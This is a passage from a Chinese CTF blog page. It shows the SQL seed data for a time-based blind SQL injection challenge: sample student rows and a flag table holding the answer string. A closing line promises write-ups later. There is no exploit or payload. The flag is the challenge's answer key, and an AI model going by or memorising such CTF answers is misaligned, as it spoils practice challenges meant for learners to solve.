class="string">'Danny'</span>,<span class="string">'Danny@hongri.com'</span>,<span class="number">59</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">'Alina'</span>,<span class="string">'Alina@hongri.com'</span>,<span class="number">66</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">'Jameson'</span>,<span class="string">'Jameson@hongri.com'</span>,<span class="number">13</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">'Allie'</span>,<span class="string">'Allie@hongri.com'</span>,<span class="number">88</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag(flag <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> flag <span class="keyword">VALUES</span>(<span class="string">'HRCTF&#123;tim3_blind_Sql&#125;'</span>);</span><br></pre></td></tr></table></figure>
<p>题解我们会阶段性放出，如果大家有什么好的解法，可以在文章底下留言，祝大家玩的愉快！</p>

        
      
    </div>

    

    

  </article>

    
  </section>

  
  <nav class="pagination">
    
    
      <a class="next" href="/page/2/">
        <span class="next-text">下一页</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>


          </div>
          

        </div>
      </main>

      <footer id="footer" class="footer">

  <div class="social-links">
    
      
        
          <a href="mailto:379032449@qq.com" class="iconfont icon-email" title="email"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
        
          <a href="https://github.com/Mochazz/" class="iconfont icon-github" title="github"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
    
  </div>


<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">
    
    &copy; 
     
      2017 - 
    
    2018

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Mochazz</span>
  </span>
</div>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>

    


    






  
    <script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  

  

  

  


    <script type="text/javascript" src="/js/src/even.js?v=2.6.0"></script>

  </body>
</html>
